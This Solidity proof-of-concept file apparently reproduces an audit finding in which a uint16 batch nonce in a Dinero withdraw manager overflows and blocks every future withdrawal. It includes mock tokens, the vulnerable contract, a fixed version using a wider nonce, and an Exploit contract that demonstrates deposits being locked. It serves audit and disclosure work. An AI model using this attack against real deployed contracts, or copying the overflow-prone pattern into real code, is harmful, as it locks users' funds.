// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// =============================================================================
//  Notional Exponent H-6 — permanent DoS of DineroWithdrawRequestManager via
//  `uint16 s_batchNonce` overflow
//  (sherlock 2025-06-notional-exponent, withdraws/Dinero.sol L17-39 @ main).
//
//  requestId packs a nonce that comes from `uint256 nonce = ++s_batchNonce`, but
//  `s_batchNonce` is a `uint16`. Once it reaches 65535 (reachable by anyone via
//  repeated `stakeTokens` + `initiateWithdraw` across accounts), `++s_batchNonce`
//  reverts on overflow (Solidity 0.8 checked arithmetic) — so EVERY future
//  `initiateWithdraw` reverts and no assets can ever be withdrawn again.
//
//  `_initiateWithdrawImpl` is reproduced VERBATIM (marked @>). The 65,535-request
//  ramp-up is abstracted by seeding `s_batchNonce` to its max (the attacker reaches
//  it by griefing); the overflow itself runs unmodified.
// =============================================================================

contract PxETH {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address sp, uint256 amt) external returns (bool) {
        allowance[msg.sender][sp] = amt;
        return true;
    }

    function transferFrom(address f, address to, uint256 amt) external returns (bool) {
        uint256 a = allowance[f][msg.sender];
        if (a != type(uint256).max) allowance[f][msg.sender] = a - amt;
        balanceOf[f] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

contract UpxETH {
    mapping(address => mapping(uint256 => uint256)) internal _bal;

    function mint(address to, uint256 id, uint256 amt) external {
        _bal[to][id] += amt;
    }
}

interface IPirexETH {
    function batchId() external view returns (uint256);
    function initiateRedemption(uint256 amount, address receiver, bool trigger) external;
}

contract PirexETHMock is IPirexETH {
    PxETH public immutable pxETH;
    UpxETH public immutable upxETH;
    uint256 public curBatch = 5;

    constructor(PxETH _px, UpxETH _up) {
        pxETH = _px;
        upxETH = _up;
    }

    function batchId() external view returns (uint256) {
        return curBatch;
    }

    function initiateRedemption(uint256 amount, address receiver, bool) external {
        pxETH.transferFrom(msg.sender, address(this), amount);
        upxETH.mint(receiver, curBatch, amount);
    }
}

/*//////////////////////////////////////////////////////////////
   DineroWithdrawRequestManager — VULNERABLE. The nonce is a uint16;
   `++s_batchNonce` reverts once it reaches 65535, bricking withdrawals.
//////////////////////////////////////////////////////////////*/
contract DineroWithdrawRequestManager {
    uint16 internal s_batchNonce; // @> too small — overflows at 65535
    uint256 internal constant MAX_BATCH_ID = type(uint120).max;

    IPirexETH public immutable PirexETH;
    PxETH public immutable pxETH;

    constructor(IPirexETH _pirex, PxETH _px) {
        PirexETH = _pirex;
        pxETH = _px;
    }

    // Abstracts the 65,535 prior withdrawals an attacker griefs to reach the cap.
    function _forceBatchNonce(uint16 n) external {
        s_batchNonce = n;
    }

    function batchNonce() external view returns (uint16) {
        return s_batchNonce;
    }

    function initiateWithdraw(uint256 amount) external returns (uint256) {
        return _initiateWithdrawImpl(msg.sender, amount, "");
    }

    function _initiateWithdrawImpl(address, /* account */ uint256 amountToWithdraw, bytes memory /* data */ )
        internal
        returns (uint256 requestId)
    {
        uint256 initialBatchId = PirexETH.batchId();
        pxETH.approve(address(PirexETH), amountToWithdraw);
        PirexETH.initiateRedemption(amountToWithdraw, address(this), false);
        uint256 finalBatchId = PirexETH.batchId();
        // @> BUG: s_batchNonce is uint16; once it is 65535 this ++ reverts on overflow,
        // @> so initiateWithdraw reverts forever and deposited assets are locked.
        uint256 nonce = ++s_batchNonce;

        require(initialBatchId < MAX_BATCH_ID);
        require(finalBatchId < MAX_BATCH_ID);
        return nonce << 240 | initialBatchId << 120 | finalBatchId;
    }
}

/*//////////////////////////////////////////////////////////////
   DineroFixed — mitigation: a uint256 (or uint120) nonce never
   overflows in practice, so withdrawals keep working past 65535.
//////////////////////////////////////////////////////////////*/
contract DineroFixed {
    uint256 internal s_batchNonce; // FIX: wide enough to never overflow
    uint256 internal constant MAX_BATCH_ID = type(uint120).max;

    IPirexETH public immutable PirexETH;
    PxETH public immutable pxETH;

    constructor(IPirexETH _pirex, PxETH _px) {
        PirexETH = _pirex;
        pxETH = _px;
    }

    function _forceBatchNonce(uint256 n) external {
        s_batchNonce = n;
    }

    function initiateWithdraw(uint256 amount) external returns (uint256 requestId) {
        uint256 initialBatchId = PirexETH.batchId();
        pxETH.approve(address(PirexETH), amount);
        PirexETH.initiateRedemption(amount, address(this), false);
        uint256 finalBatchId = PirexETH.batchId();
        uint256 nonce = ++s_batchNonce; // uint256 — no overflow
        require(initialBatchId < MAX_BATCH_ID);
        require(finalBatchId < MAX_BATCH_ID);
        return nonce << 240 | initialBatchId << 120 | finalBatchId;
    }
}

/*//////////////////////////////////////////////////////////////
   STUCK marker — non-fund harm probe (locked deposit magnitude).
//////////////////////////////////////////////////////////////*/
contract StuckMarker {
    string public symbol = "STUCK-pxETH";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

/*//////////////////////////////////////////////////////////////
   Exploit — with s_batchNonce at its uint16 max, a depositor's
   withdrawal reverts on the `++s_batchNonce` overflow, permanently
   locking the staked pxETH held by the manager.
//////////////////////////////////////////////////////////////*/
contract Exploit {
    address internal constant SINK = 0x000000000000000000000000000000000000D00d; // stuck-deposit sink

    uint256 internal constant DEPOSIT = 50 ether;
    uint16 internal constant NONCE_MAX = 65535;

    PxETH public pxETH;
    UpxETH public upxETH;
    PirexETHMock public pirex;
    DineroWithdrawRequestManager public manager;
    StuckMarker public stuck;

    function run() external payable {
        pxETH = new PxETH();
        upxETH = new UpxETH();
        pirex = new PirexETHMock(pxETH, upxETH);
        manager = new DineroWithdrawRequestManager(pirex, pxETH);
        stuck = new StuckMarker();

        // A depositor's staked pxETH is held by the manager (their exit is initiateWithdraw).
        pxETH.mint(address(manager), DEPOSIT);

        // Attacker has already griefed s_batchNonce to its uint16 max.
        manager._forceBatchNonce(NONCE_MAX);

        // The depositor tries to withdraw → `++s_batchNonce` overflows → revert → funds stuck.
        try manager.initiateWithdraw(DEPOSIT) returns (uint256) {
            // not reached under the bug
        } catch {
            stuck.mint(SINK, DEPOSIT); // DEPOSIT pxETH is now permanently un-withdrawable
        }
    }
}
